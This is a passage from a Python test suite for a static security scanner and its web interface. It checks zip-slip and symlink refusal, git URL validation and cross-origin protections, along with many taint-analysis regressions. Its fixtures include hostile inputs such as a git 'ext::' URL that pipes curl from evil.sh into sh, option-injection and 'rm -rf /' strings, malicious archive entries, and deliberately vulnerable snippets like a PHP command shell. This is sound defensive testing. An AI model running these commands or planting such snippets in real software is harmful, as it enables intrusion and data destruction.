        self.assertEqual(second.get(record.id).status, INTERRUPTED)
        second.close()

    def test_delete_removes_record_and_report(self):
        store = self._store()
        record = store.create("path", "/srv/app")
        store.write_report(record.id, "<html>x</html>")
        report_file = store.report_path(record.id)
        self.assertTrue(os.path.exists(report_file))
        self.assertTrue(store.delete(record.id))
        self.assertIsNone(store.get(record.id))
        self.assertFalse(os.path.exists(report_file))
        store.close()

    def test_scan_id_cannot_escape_the_reports_directory(self):
        store = self._store()
        with self.assertRaises(ValueError):
            store.report_path("../../etc/passwd")
        store.close()


class TestWebSourceHardening(unittest.TestCase):
    """The web form accepts attacker-shaped input; these are the guards."""

    def _zip(self, entries=None, symlink=None, absolute=False, traversal=False):
        import io
        import stat as _stat
        import zipfile as _zip
        buf = io.BytesIO()
        with _zip.ZipFile(buf, "w") as z:
            for name, content in (entries or {"ok.py": "x = 1\n"}).items():
                z.writestr(name, content)
            if symlink:
                info = _zip.ZipInfo(symlink)
                info.external_attr = (_stat.S_IFLNK | 0o777) << 16
                z.writestr(info, "/etc/passwd")
            if absolute:
                z.writestr("/etc/cron.d/evil", "* * * * * root sh")
            if traversal:
                z.writestr("../../../../tmp/evil.sh", "#!/bin/sh\n")
        return buf.getvalue()

    def test_normal_archive_extracts(self):
        from sast.web.sources import extract_zip
        directory, _label, cleanup = extract_zip(
            self._zip({"proj/app.py": "import os\n"}), "proj.zip")
        try:
            self.assertIn("app.py", os.listdir(directory))
        finally:
            cleanup()

    def test_zip_slip_is_refused(self):
        from sast.web.sources import SourceError, extract_zip
        with self.assertRaises(SourceError) as ctx:
            extract_zip(self._zip(traversal=True), "evil.zip")
        self.assertIn("traversal", str(ctx.exception))

    def test_absolute_path_entry_is_refused(self):
        from sast.web.sources import SourceError, extract_zip
        with self.assertRaises(SourceError):
            extract_zip(self._zip(absolute=True), "evil.zip")

    def test_symlink_entry_is_refused(self):
        from sast.web.sources import SourceError, extract_zip
        with self.assertRaises(SourceError) as ctx:
            extract_zip(self._zip(symlink="link"), "evil.zip")
        self.assertIn("symlink", str(ctx.exception))

    def test_non_zip_upload_is_rejected_cleanly(self):
        from sast.web.sources import SourceError, extract_zip
        with self.assertRaises(SourceError):
            extract_zip(b"definitely not a zip", "x.zip")

    def test_git_url_allowlist(self):
        from sast.web.sources import validate_git_url
        for url in ("https://github.com/o/r.git", "http://host/r.git",
                    "ssh://git@host/o/r.git", "git://host/r.git",
                    "git@github.com:owner/repo.git"):
            self.assertEqual(validate_git_url(url), url)

    def test_git_ext_transport_is_refused(self):
        """ext:: runs an arbitrary command — the classic git clone RCE."""
        from sast.web.sources import SourceError, validate_git_url
        with self.assertRaises(SourceError) as ctx:
            validate_git_url('ext::sh -c "curl evil.sh | sh"')
        self.assertIn("ext::", str(ctx.exception))

    def test_git_option_injection_is_refused(self):
        from sast.web.sources import SourceError, validate_git_url
        for url in ("--upload-pack=/bin/sh", "-u /bin/sh"):
            with self.assertRaises(SourceError):
                validate_git_url(url)

    def test_git_local_and_control_characters_refused(self):
        from sast.web.sources import SourceError, validate_git_url
        for url in ("file:///etc/passwd", "/etc/passwd",
                    "https://h/r.git\nrm -rf /", "javascript:alert(1)"):
            with self.assertRaises(SourceError):
                validate_git_url(url)

    def test_local_path_must_exist_and_be_a_directory(self):
        from sast.web.sources import SourceError, resolve_local_path
        with self.assertRaises(SourceError):
            resolve_local_path("/definitely/not/here")
        handle = tempfile.NamedTemporaryFile(delete=False)
        handle.close()
        with self.assertRaises(SourceError):
            resolve_local_path(handle.name)


class TestWebServer(unittest.TestCase):
    """Routes, scanning, and the browser-facing protections."""

    @classmethod
    def setUpClass(cls):
        import threading
        from sast.web.server import make_server
        cls.data_dir = tempfile.mkdtemp(prefix="sast-web-")
        cls.httpd, cls.store, cls.service = make_server("127.0.0.1", 0, cls.data_dir)
        cls.port = cls.httpd.server_address[1]
        cls.base = f"http://127.0.0.1:{cls.port}"
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.store.close()

    # -- helpers ---------------------------------------------------------
    def _post(self, path, fields=None, files=None, headers=None):
        import urllib.error
        import urllib.request
        boundary = "----sasttest"
        body = b""
        for key, value in (fields or {}).items():
            body += (f'--{boundary}\r\nContent-Disposition: form-data; '
                     f'name="{key}"\r\n\r\n{value}\r\n').encode()
        for key, (name, data) in (files or {}).items():
            body += (f'--{boundary}\r\nContent-Disposition: form-data; '
                     f'name="{key}"; filename="{name}"\r\n'
                     f'Content-Type: application/zip\r\n\r\n').encode() + data + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        req = urllib.request.Request(self.base + path, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        for key, value in (headers or {}).items():
            req.add_header(key, value)
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                return resp.status, json.loads(resp.read())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read())

    def _get(self, path, headers=None):
        import urllib.error
        import urllib.request
        req = urllib.request.Request(self.base + path)
        for key, value in (headers or {}).items():
            req.add_header(key, value)
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read()

    def _await(self, scan_id, timeout=120):
        deadline = time.time() + timeout
        while time.time() < deadline:
            _code, raw = self._get(f"/api/scan/{scan_id}")
            record = json.loads(raw)
            if record["status"] != "running":
                return record
            time.sleep(0.2)
        self.fail(f"scan {scan_id} did not finish")

    # -- tests -----------------------------------------------------------
    def test_index_serves_the_form(self):
        code, body = self._get("/")
        self.assertEqual(code, 200)
        self.assertIn(b'id="form"', body)
        for tab in (b"Local path", b"ZIP upload", b"Git repository"):
            self.assertIn(tab, body)

    def test_scan_local_path_and_serve_report(self):
        src = tempfile.mkdtemp()
        with open(os.path.join(src, "a.php"), "w") as fh:
            fh.write('<?php system($_GET["c"]);')
        code, payload = self._post("/start", {"source_type": "path", "path": src})
        self.assertEqual(code, 202)
        record = self._await(payload["id"])
        self.assertEqual(record["status"], "done")
        self.assertGreater(record["findings"], 0)

        code, report = self._get(f"/report/{payload['id']}")
        self.assertEqual(code, 200)
        self.assertTrue(report.lstrip().startswith(b"<!DOCTYPE html>"))
        self.assertIn(b"php-cmdi-system", report)

        code, raw = self._get(f"/report/{payload['id']}.json")
        self.assertEqual(code, 200)
        self.assertIn("findings", json.loads(raw))

    def test_scan_zip_upload(self):
        import io
        import zipfile as _zip
        buf = io.BytesIO()
        with _zip.ZipFile(buf, "w") as z:
            z.writestr("proj/app.py",
                       "import os\nfrom flask import request\n"
                       "def h(): os.system(request.args['d'])\n")
        code, payload = self._post("/start", {"source_type": "zip"},
                                   {"archive": ("proj.zip", buf.getvalue())})
        self.assertEqual(code, 202)
        record = self._await(payload["id"])
        self.assertEqual(record["status"], "done")
        self.assertGreater(record["findings"], 0)
        self.assertEqual(record["source_label"], "proj.zip")

    def test_malicious_git_url_fails_the_scan_not_the_server(self):
        code, payload = self._post(
            "/start", {"source_type": "git", "git": 'ext::sh -c "id"', "branch": ""})
        self.assertEqual(code, 202)
        record = self._await(payload["id"])
        self.assertEqual(record["status"], "failed")
        self.assertIn("ext::", record["error"])
        # The server is still serving afterwards.
        self.assertEqual(self._get("/healthz")[0], 200)

    def test_history_lists_scans(self):
        code, raw = self._get("/api/scans")
        self.assertEqual(code, 200)
        self.assertIsInstance(json.loads(raw)["scans"], list)

    def test_unknown_host_header_is_refused(self):
        """Blocks a page on another origin from driving this server via DNS."""
        code, _body = self._get("/", headers={"Host": "evil.example.com"})
        self.assertEqual(code, 421)

    def test_cross_origin_post_is_refused(self):
        code, _payload = self._post("/start", {"source_type": "path", "path": "/tmp"},
                                    headers={"Origin": "http://evil.example.com"})
        self.assertEqual(code, 403)

    def test_bad_source_type_is_rejected(self):
        code, payload = self._post("/start", {"source_type": "wat"})
        self.assertEqual(code, 400)
        self.assertIn("error", payload)

    def test_missing_path_is_rejected(self):
        code, _payload = self._post("/start", {"source_type": "path", "path": ""})
        self.assertEqual(code, 400)

    def test_unknown_routes_404(self):
        self.assertEqual(self._get("/nope")[0], 404)
        self.assertEqual(self._get("/report/deadbeef")[0], 404)

    def test_delete_scan(self):
        src = tempfile.mkdtemp()
        with open(os.path.join(src, "a.php"), "w") as fh:
            fh.write("<?php echo 1;")
        _code, payload = self._post("/start", {"source_type": "path", "path": src})
        self._await(payload["id"])
        code, result = self._post(f"/delete/{payload['id']}")
        self.assertEqual(code, 200)
        self.assertTrue(result["deleted"])
        self.assertEqual(self._get(f"/api/scan/{payload['id']}")[0], 404)


class TestMultipartParser(unittest.TestCase):
    """cgi.FieldStorage was removed in 3.13, so this is hand-rolled."""

    def _body(self, boundary, parts):
        out = b""
        for name, filename, data in parts:
            disposition = f'form-data; name="{name}"'
            if filename:
                disposition += f'; filename="{filename}"'
            out += (f"--{boundary}\r\nContent-Disposition: {disposition}\r\n\r\n"
                    ).encode() + data + b"\r\n"
        return out + f"--{boundary}--\r\n".encode()

    def test_fields_and_binary_file(self):
        from sast.web import multipart
        blob = bytes(range(256)) * 4
        body = self._body("abc123", [
            ("source_type", "", b"zip"),
            ("archive", "x.zip", blob),
        ])
        parts = multipart.parse(body, "multipart/form-data; boundary=abc123")
        self.assertEqual(parts["source_type"].text, "zip")
        self.assertEqual(parts["archive"].data, blob)
        self.assertEqual(parts["archive"].filename, "x.zip")

    def test_quoted_boundary(self):
        from sast.web import multipart
        body = self._body("xy", [("a", "", b"1")])
        parts = multipart.parse(body, 'multipart/form-data; boundary="xy"')
        self.assertEqual(parts["a"].text, "1")

    def test_missing_boundary_yields_nothing(self):
        from sast.web import multipart
        self.assertEqual(multipart.parse(b"junk", "multipart/form-data"), {})


# ---------------------------------------------------------------------------
# Regression tests for the false-negative sweep against known-vulnerable apps.
#
# Each case below is a shape that a real vulnerable application used and the
# engine missed. They are grouped by the language whose probe found them, and
# the taint-propagation ones assert in both directions where the fix could
# plausibly have gone too far.
# ---------------------------------------------------------------------------
class TestPythonPropagation(unittest.TestCase):
    """Shapes from DSVW and the Flask probe that used to lose taint."""

    BASE = ('import os\n'
            'from flask import request\n'
            'def v():\n'
            '    q = request.args["p"]\n'
            '%s\n')

    def _rules(self, body):
        return {f.rule_id for f in _scan({"a.py": self.BASE % body}).findings}

    def test_propagation_shapes(self):
        cases = {
            "tuple unpacking":
                '    a, b = q.split("?", 1)\n    os.system("echo " + a)',
            "chained assignment":
                '    x = y = q\n    os.system("echo " + y)',
            "generator expression into dict()":
                '    d = dict((m, m) for m in q.split("&"))\n'
                '    os.system("echo " + d["z"])',
            "list comprehension":
                '    items = [i for i in q.split(",")]\n'
                '    os.system("echo " + items[0])',
            "dict comprehension":
                '    d = {k: k for k in q.split("&")}\n'
                '    os.system("echo " + d["a"])',
            "tuple unpack from a literal tuple":
                '    a, b = (q, "x")\n    os.system("echo " + a)',
            "for-loop binding":
                '    for tok in q.split(","):\n        os.system("echo " + tok)',
            "f-string":
                '    os.system(f"echo {q}")',
        }
        for label, body in cases.items():
            self.assertIn("py-cmdi-os-system", self._rules(body), label)

    def test_literal_assignment_still_clears(self):
        self.assertEqual(self._rules('    q = "safe"\n    os.system(q)'), set())

    def test_http_server_handler_attributes_are_sources(self):
        """DSVW reads the request off `self`, not off a framework object."""
        rules = {f.rule_id for f in _scan({"h.py":
            "import http.server, os\n"
            "class H(http.server.BaseHTTPRequestHandler):\n"
            "    def do_GET(self):\n"
            "        os.system(self.path)\n"}).findings}
        self.assertIn("py-cmdi-os-system", rules)

    def test_self_path_is_not_a_source_outside_a_handler(self):
        """`self.path` is a filename in most classes; the rule is gated."""
        rules = {f.rule_id for f in _scan({"n.py":
            "import os\n"
            "class Thing:\n"
            "    def run(self):\n"
            "        os.system(self.path)\n"}).findings}
        self.assertNotIn("py-cmdi-os-system", rules)


class TestCPropagation(unittest.TestCase):
    """Damn_Vulnerable_C_Program reported nothing at all before these."""

    def _rules(self, body):
        return {f.rule_id for f in _scan({"a.c": body}).findings}

    def test_function_parameters_bind(self):
        """A parameter name sits inside a pointer_declarator, not beside it."""
        self.assertIn("c-path-fopen", self._rules(
            "#include <stdio.h>\n"
            "int go(char *filename) { return fopen(filename, \"r\") != 0; }\n"
            "int main(int argc, char **argv) { return go(argv[1]); }\n"))

    def test_cast_does_not_hide_the_call(self):
        """`(char *)malloc(n)` must not strip to the type `char *`."""
        self.assertIn("c-int-malloc", self._rules(
            "#include <stdlib.h>\n#include <stdio.h>\n"
            "void f(void) { int n; scanf(\"%d\", &n);"
            " char *p = (char *)malloc(n); (void)p; }\n"))

    def test_out_parameter_is_the_tainted_value(self):
        """scanf returns a count; the data lands in the argument."""
        self.assertIn("c-int-malloc", self._rules(
            "#include <stdlib.h>\n#include <stdio.h>\n"
            "void f(void) { int n; scanf(\"%d\", &n); malloc(n); }\n"))

    def test_sink_inside_a_condition_is_seen(self):
        """`while (fread(&x, ...) > 0)` used to be skipped entirely."""
        self.assertIn("c-buf-memcpy", self._rules(
            "#include <stdio.h>\n#include <string.h>\n"
            "struct S { int w; char d[4]; };\n"
            "void f(FILE *fp, char *dst) { struct S s;\n"
            "  while (fread(&s, sizeof(s), 1, fp) > 0) {"
            " memcpy(dst, s.d, s.w); } }\n"))


class TestJavaConstantFolding(unittest.TestCase):
    """A decidable condition has one live arm; the dead one must not merge."""

    BASE = ('import javax.servlet.http.*;\n'
            'public class C extends HttpServlet {\n'
            '  public void doPost(HttpServletRequest request,'
            ' HttpServletResponse response) {\n'
            '    String param = request.getParameter("x");\n'
            '    int num = 86;\n'
            '%s\n  }\n}\n')

    def _rules(self, body):
        return {f.rule_id for f in _scan({"C.java": self.BASE % body}).findings}

    def test_dead_branch_does_not_taint(self):
        quiet = {
            "always-true if":
                '    String b; if ((7 * 42) - num > 200) b = "safe";'
                ' else b = param; Runtime.getRuntime().exec(b);',
            "always-true ternary":
                '    String b = (500 > 200) ? "safe" : param;'
                ' Runtime.getRuntime().exec(b);',
            "if (false) with no else":
                '    String b = "safe"; if (1 > 2) { b = param; }'
                ' Runtime.getRuntime().exec(b);',
            "switch on a constant selector":
                '    String b; switch (num) { case 86: b = "safe"; break;'
                ' default: b = param; } Runtime.getRuntime().exec(b);',
            "switch on a constant charAt":
                '    String b; String g = "ABC";'
                ' switch (g.charAt(1)) { case \'A\': b = param; break;'
                ' case \'B\': b = "safe"; break; default: b = param; }'
                ' Runtime.getRuntime().exec(b);',
        }
        for label, body in quiet.items():
            self.assertNotIn("java-cmdi-exec", self._rules(body), label)

    def test_live_branch_still_taints(self):
        loud = {
            "always-false if":
                '    String b; if ((7 * 42) - num > 500) b = "safe";'
                ' else b = param; Runtime.getRuntime().exec(b);',
            "always-false ternary":
                '    String b = (200 > 500) ? "safe" : param;'
                ' Runtime.getRuntime().exec(b);',
            "undecidable condition":
                '    String b; if (param != null) b = "safe";'
                ' else b = param; Runtime.getRuntime().exec(b);',
            "constant clobbered inside a branch":
                '    int n2 = 1; if (param != null) { n2 = 900; }'
                ' String b; if (n2 > 500) b = param; else b = "safe";'
                ' Runtime.getRuntime().exec(b);',
            "if (true) taking the tainted arm":
                '    String b = "safe"; if (2 > 1) { b = param; }'
                ' Runtime.getRuntime().exec(b);',
            "switch falling through to the tainted arm":
                '    String b; switch (num) { case 86: b = param;'
                ' case 7: break; default: b = "safe"; }'
                ' Runtime.getRuntime().exec(b);',
        }
        for label, body in loud.items():
            self.assertIn("java-cmdi-exec", self._rules(body), label)

    def test_braceless_branch_body_is_walked(self):
        """The Benchmark's getParameterMap shape ends in a braceless if."""
        self.assertIn("java-cmdi-exec", self._rules(
            '    java.util.Map<String, String[]> map = request.getParameterMap();\n'
            '    String b = "";\n'
            '    if (!map.isEmpty()) {\n'
            '      String[] values = map.get("x");\n'
            '      if (values != null) b = values[0];\n'
            '    }\n'
            '    Runtime.getRuntime().exec(b);'))

    def test_constructor_carries_its_arguments(self):
        """A Base64 round trip through `new String(...)` is not sanitising."""
        self.assertIn("java-cmdi-exec", self._rules(
            '    String b = new String(param.getBytes());\n'
            '    Runtime.getRuntime().exec(b);'))


class TestGoProbeShapes(unittest.TestCase):
    """Sink shapes govwa used that the Go rules claimed but did not match."""

    BASE = ('package main\n'
            'import ("net/http"; "io/ioutil"; "fmt"; "os")\n'
            'func h(w http.ResponseWriter, r *http.Request) {\n'
            '  q := r.FormValue("q")\n'
            '%s\n}\n')

    def _rules(self, body):
        return {f.rule_id for f in
                _scan({"go.mod": "module x\n", "a.go": self.BASE % body}).findings}

    def test_receiver_hint_mismatches(self):
        cases = {
            "  ioutil.WriteFile(q, nil, 0644)": "go-path-ioutil-writefile",
            '  fmt.Fprintf(w, "<b>%s</b>", q)': "go-xss-fmt-fprintf",
            '  w.Header().Set("Location", q)': "go-header-set",
        }
        for stmt, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(stmt), stmt)

    def test_type_conversion_keeps_the_value(self):
        """`[]byte(q)` must not strip to the type `[]byte`."""
        self.assertIn("go-xss-write", self._rules("  w.Write([]byte(q))"))

    def test_os_path_rule_ids_are_unchanged(self):
        """Splitting os/ioutil must not rename ids people may suppress."""
        self.assertIn("go-path-open", self._rules("  os.Open(q)"))

    def test_method_parameters_bind_not_the_receiver(self):
        """A Go method's receiver is a parameter_list too, and comes first."""
        rules = {f.rule_id for f in _scan({"go.mod": "module x\n", "a.go":
            'package main\n'
            'import ("net/http"; "os/exec")\n'
            'type P struct{}\n'
            'func (p *P) run(cmd string) { exec.Command("sh", "-c", cmd) }\n'
            'func h(w http.ResponseWriter, r *http.Request) {\n'
            '  p := &P{}\n  p.run(r.FormValue("c"))\n}\n'}).findings}
        self.assertIn("go-cmdi-command", rules)


class TestCSharpProbeShapes(unittest.TestCase):
    """WebGoat.NET found almost nothing before these."""

    def _rules(self, files):
        return {f.rule_id for f in _scan(files).findings}

    def _page(self, body):
        return self._rules({"P.cs":
            "using System;\n"
            "public class P : System.Web.UI.Page {\n"
            "  protected void Page_Load(object sender, EventArgs e) {\n"
            f"    {body}\n  }}\n}}\n"})

    def test_webforms_indexer_is_a_source(self):
        """`Request["city"]` has no member name at all."""
        self.assertIn("cs-sqli-sqlcommand",
                      self._page('new SqlCommand("SELECT " + Request["c"], null);'))

    def test_provider_specific_command_classes(self):
        """Only the prefix differs between ADO.NET providers."""
        self.assertIn("cs-sqli-mysqlcommand",
                      self._page('new MySqlCommand("SELECT " + Request["c"], null);'))

    def test_execute_on_a_tainted_command(self):
        """The execute call takes no arguments; the taint is the receiver."""
        self.assertIn("cs-sqli-cmd-executereader", self._page(
            'var cmd = new SqlCommand("SELECT " + Request["c"], null);'
            ' cmd.ExecuteReader();'))

    def test_command_text_property(self):
        self.assertIn("cs-sqli-commandtext", self._page(
            'var cmd = new SqlCommand(); cmd.CommandText = "SELECT " + Request["c"];'))

    def test_generic_call_keeps_its_name(self):
        """`Deserialize<object>(x)` matched as "Deserialize<object>"."""
        self.assertIn("cs-deser-deserialize", self._page(
            'var s = new System.Web.Script.Serialization.JavaScriptSerializer();'
            ' s.Deserialize<object>(Request["c"]);'))

    def test_interface_dispatch_reaches_the_real_implementation(self):
        """A bodiless interface method used to hide the implementation, and
        only one implementation per name was ever analysed — so WebGoat.NET's
        SQL layer resolved to a stub provider."""
        rules = self._rules({
            "I.cs": "public interface IDb { string Get(string n); }\n",
            "Stub.cs": ("public class StubDb : IDb {\n"
                        "  public string Get(string n) { return \"x\"; }\n}\n"),
            "Real.cs": ("using MySql.Data.MySqlClient;\n"
                        "public class RealDb : IDb {\n"
                        "  public string Get(string n) {\n"
                        "    new MySqlCommand(\"SELECT \" + n, null);\n"
                        "    return null;\n  }\n}\n"),
            "P.cs": ("using System;\n"
                     "public class P : System.Web.UI.Page {\n"
                     "  private IDb du = null;\n"
                     "  protected void Page_Load(object s, EventArgs e) {\n"
                     "    du.Get(Request[\"n\"]);\n  }\n}\n"),
        })
        self.assertIn("cs-sqli-mysqlcommand", rules)


class TestConfiguredCrypto(unittest.TestCase):
    """A hash or cipher chosen in a .properties file.

    `MessageDigest.getInstance(props.getProperty("hashAlg"))` is a call no
    amount of taint tracking can judge: the question is what the algorithm
    *is*. The answer sits in the repository, so the engine reads it.
    """

    PROPS = ("hashAlg1=MD5\n"
             "hashAlg2=SHA-256\n"
             "cryptoAlg1=DES/ECB/PKCS5Padding\n")

    def _rules(self, body):
        src = ("import java.util.Properties;\n"
               "public class H {\n"
               "  public void f(Properties p) throws Exception {\n"
               f"    {body}\n  }}\n}}\n")
        return {f.rule_id for f in
                _scan({"app.properties": self.PROPS, "H.java": src}).findings}

    def test_weak_key_is_resolved_at_the_call_site(self):
        rules = self._rules(
            'String a = p.getProperty("hashAlg1", "SHA512");'
            ' java.security.MessageDigest.getInstance(a);')
        self.assertIn("java-crypto-weak-hash-algorithm", rules)

    def test_strong_key_stays_silent(self):
        rules = self._rules(
            'String a = p.getProperty("hashAlg2", "MD5");'
            ' java.security.MessageDigest.getInstance(a);')
        self.assertNotIn("java-crypto-weak-hash-algorithm", rules)

    def test_absent_key_falls_back_to_the_default(self):
        rules = self._rules(
            'String a = p.getProperty("nosuchkey", "MD5");'
            ' java.security.MessageDigest.getInstance(a);')
        self.assertIn("java-crypto-weak-hash-algorithm", rules)

    def test_cipher_family(self):
        rules = self._rules(
            'javax.crypto.Cipher.getInstance(p.getProperty("cryptoAlg1"));')
        self.assertIn("java-crypto-weak-cipher", rules)

    def test_the_properties_file_is_flagged_on_its_own(self):
        """Even with no code reading it, the configured value is the bug."""
        rules = {f.rule_id for f in
                 _scan({"app.properties": self.PROPS}).findings}
        self.assertIn("config-weak-hash-algorithm", rules)
        self.assertIn("config-weak-cipher-algorithm", rules)

    def test_ambiguous_key_is_not_resolved(self):
        """Two files disagreeing means nothing is known; do not guess."""
        src = ("import java.util.Properties;\n"
               "public class H {\n"
               "  public void f(Properties p) throws Exception {\n"
               '    String a = p.getProperty("alg", "SHA-256");\n'
               "    java.security.MessageDigest.getInstance(a);\n  }\n}\n")
        rules = {f.rule_id for f in _scan({
            "a.properties": "alg=MD5\n",
            "b.properties": "alg=SHA-256\n",
            "H.java": src}).findings}
        self.assertNotIn("java-crypto-weak-hash-algorithm", rules)


class TestMemorySafety(unittest.TestCase):
    """Use-after-free and double-free in C.

    These are the dominant C vulnerability class and no taint path reaches
    them: the bug exists wherever the values came from. The negative cases
    matter as much as the positive ones — flagging `free(p); p = NULL;`, the
    recommended idiom, would make the checker unusable.
    """

    def _rules(self, body):
        return {f.rule_id for f in
                _scan({"m.c": "#include <stdlib.h>\n#include <stdio.h>\n"
                              + body}).findings}

    def test_correct_code_is_silent(self):
        cases = {
            "NULL after free":
                "void f(void) { char *p = malloc(10); free(p); p = NULL;"
                " if (p) free(p); }",
            "reallocated between frees":
                "void f(void) { char *p = malloc(10); free(p);"
                " p = malloc(10); free(p); }",
            "either-or frees":
                "void f(int c) { char *p = malloc(10); char *q = malloc(10);"
                " if (c) free(p); else free(q); }",
            "ownership returned":
                "char *f(void) { char *p = malloc(10); return p; }",
            "freed once at the end":
                "void f(void) { char *p = malloc(10); p[0] = 'a'; free(p); }",
            "NULL store under a label":
                "void f(char *p) { goto done; done: if (p) { free(p);"
                " p = NULL; } }",
        }
        for label, body in cases.items():
            found = {r for r in self._rules(body) if "free" in r}
            self.assertEqual(found, set(), label)

    def test_bugs_are_found(self):
        cases = {
            "double free":
                ("void f(void) { char *p = malloc(10); free(p); free(p); }",
                 "c-double-free"),
            "use after free":
                ("void f(void) { char *p = malloc(10); free(p);"
                 ' printf("%c", p[0]); }',
                 "c-use-after-free"),
            "write through an alias":
                ("void f(void) { char *p = malloc(10); char *q = p;"
                 " free(p); q[0] = 'x'; }",
                 "c-use-after-free"),
            "freed parameter then used":
                ("void f(char *p) { free(p); p[0] = 'z'; }",
                 "c-use-after-free"),
            "realloc frees the old pointer":
                ("void f(void) { char *p = malloc(10);"
                 " char *n = realloc(p, 20); p[0] = 'a'; free(n); }",
                 "c-use-after-free"),
        }
        for label, (body, rule_id) in cases.items():
            self.assertIn(rule_id, self._rules(body), label)

    def test_conditional_free_is_reported_as_conditional(self):
        """Freed on one path only: real, but not certain."""
        rules = self._rules(
            "void f(int c) { char *p = malloc(10); if (c) free(p);"
            " p[0] = 'b'; }")
        self.assertIn("c-use-after-free-conditional", rules)
        self.assertNotIn("c-use-after-free", rules)

    def test_goto_disables_the_function(self):
        """A goto reorders execution, so the linear walk cannot judge it."""
        rules = self._rules(
            "void f(int c) { char *p = malloc(10); if (c) goto skip;"
            " free(p); skip: free(p); }")
        self.assertEqual({r for r in rules if "free" in r}, set())


class TestNumericTaintAndIndexing(unittest.TestCase):
    """An attacker-influenced number is not an attacker-controlled string."""

    def _rules(self, body):
        return {f.rule_id for f in
                _scan({"n.c": "#include <stdlib.h>\n#include <stdio.h>\n"
                              + body}).findings}

    HEAD = ("void f(FILE *fp) {\n"
            "  int w, h;\n"
            "  fread(&w, sizeof(w), 1, fp);\n"
            "  fread(&h, sizeof(h), 1, fp);\n")

    def test_arithmetic_keeps_the_numeric_tags(self):
        """`malloc(w * h)` is CWE-190; only `+` used to survive, because it
        doubles as string concatenation."""
        for op in ("+", "-", "*", "/"):
            body = self.HEAD + f"  malloc(w {op} h);\n}}\n"
            self.assertIn("c-int-malloc", self._rules(body), op)

    def test_arithmetic_drops_the_string_tags(self):
        """A quotient is not a command, however it was derived."""
        body = self.HEAD + '  char b[8]; sprintf(b, "%d", w / h);'
        self.assertNotIn("c-cmdi-system", self._rules(body + "\n}\n"))

    def test_tainted_index_into_a_fixed_size_array(self):
        body = self.HEAD + ("  int i = w / h;\n  char buf[10];\n"
                            "  buf[i] = 'c';\n  char r = buf[i];\n"
                            "  (void)r;\n}\n")
        self.assertIn("c-oob-index", self._rules(body))

    def test_constant_index_is_silent(self):
        body = self.HEAD + ("  char buf[10];\n  int k = 4;\n"
                            "  char r = buf[k] + buf[3];\n  (void)r;\n}\n")
        self.assertNotIn("c-oob-index", self._rules(body))

    def test_heap_pointer_index_is_not_claimed(self):
        """The buffer is nearly always sized from the value being indexed
        with, and separating `malloc(n+3)` with `buf[n+1]` from `malloc(n)`
        with `buf[n]` needs a relational analysis this does not have."""
        body = self.HEAD + ("  int i = w / h;\n  char *p = malloc(64);\n"
                            "  p[i] = 'c';\n}\n")
        self.assertNotIn("c-oob-index", self._rules(body))


class TestSameNamedFunctions(unittest.TestCase):
    """Every engine's symbol table is keyed by name for *resolution*, and
    every one of them was also used to drive analysis — so a second
    declaration sharing a name was never analysed at all. A `static` helper
    called `init` in several C files, two modules exporting `handle`, an
    unnamespaced PHP `handle()`, and a Java method overload are all ordinary
    code, not edge cases.
    """

    def _files_reporting(self, files: dict, rule_id: str) -> set:
        return {os.path.basename(f.location.file)
                for f in _scan(files).findings if f.rule_id == rule_id}

    def test_c(self):
        body = ("#include <stdlib.h>\n#include <stdio.h>\n"
                "void f(FILE *fp) { int n; fread(&n, 4, 1, fp); malloc(n); }\n")
        self.assertEqual(
            self._files_reporting({"a.c": body, "b.c": body}, "c-int-malloc"),
            {"a.c", "b.c"})

    def test_php(self):
        body = "<?php\nfunction handle() { system($_GET['a']); }\n"
        self.assertEqual(
            self._files_reporting({"a.php": body, "b.php": body},
                                  "php-cmdi-system"),
            {"a.php", "b.php"})

    def test_javascript(self):
        body = ("const { exec } = require('child_process');\n"
                "function handle(req) { exec(req.query.a); }\n"
                "module.exports = handle;\n")
        self.assertEqual(
            self._files_reporting({"a.js": body, "b.js": body},
                                  "js-cmdi-exec"),
            {"a.js", "b.js"})

    def test_java_same_named_inner_classes(self):
        def src(outer):
            return ("import javax.servlet.http.*;\n"
                    f"public class {outer} extends HttpServlet {{\n"
                    "  private class Helper {\n"
                    "    void go(HttpServletRequest r) throws Exception {\n"
                    "      Runtime.getRuntime().exec(r.getParameter(\"x\"));\n"
                    "    }\n  }\n}\n")
        self.assertEqual(
            self._files_reporting({"A.java": src("A"), "B.java": src("B")},
                                  "java-cmdi-exec"),
            {"A.java", "B.java"})

    def test_java_method_overloads(self):
        """Both `handle(r)` and `handle(r, n)` must be walked."""
        result = _scan({"C.java":
            "import javax.servlet.http.*;\n"
            "public class C extends HttpServlet {\n"
            "  void handle(HttpServletRequest r) throws Exception {\n"
            "    Runtime.getRuntime().exec(r.getParameter(\"a\"));\n  }\n"
            "  void handle(HttpServletRequest r, int n) throws Exception {\n"
            "    Runtime.getRuntime().exec(r.getParameter(\"b\"));\n  }\n}\n"})
        lines = sorted(f.location.line for f in result.findings
                       if f.rule_id == "java-cmdi-exec")
        self.assertEqual(len(lines), 2, lines)


class TestPhpProbeShapes(unittest.TestCase):
    """Sink shapes the PHP rules claimed, or should have, but did not match."""

    def _rules(self, body):
        return {f.rule_id for f in
                _scan({"p.php": "<?php\n$q = $_GET['q'];\n" + body}).findings}

    def test_newly_covered_sinks(self):
        cases = {
            "call_user_func($q);": "php-code-call_user_func",
            "call_user_func_array($q, []);": "php-code-call_user_func_array",
            "create_function('', $q);": "php-code-create_function",
            "scandir($q);": "php-path-scandir",
            "glob($q);": "php-path-glob",
            # `mail` had a rule all along, but it asked for an `email` tag no
            # source produced, so it could never fire.
            "mail($q, 's', 'b');": "php-email-mail",
            "$fn = $q; $fn();": "php-code-dynamic-call",
            "$$q = 1;": "php-mass-variable-variable",
            "preg_replace('/a/e', $q, 'x');": "php-code-preg-replace-eval",
        }
        for stmt, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(stmt), stmt)

    def test_preg_replace_without_the_e_modifier_is_silent(self):
        rules = self._rules("preg_replace('/file/i', $q, 'x');")
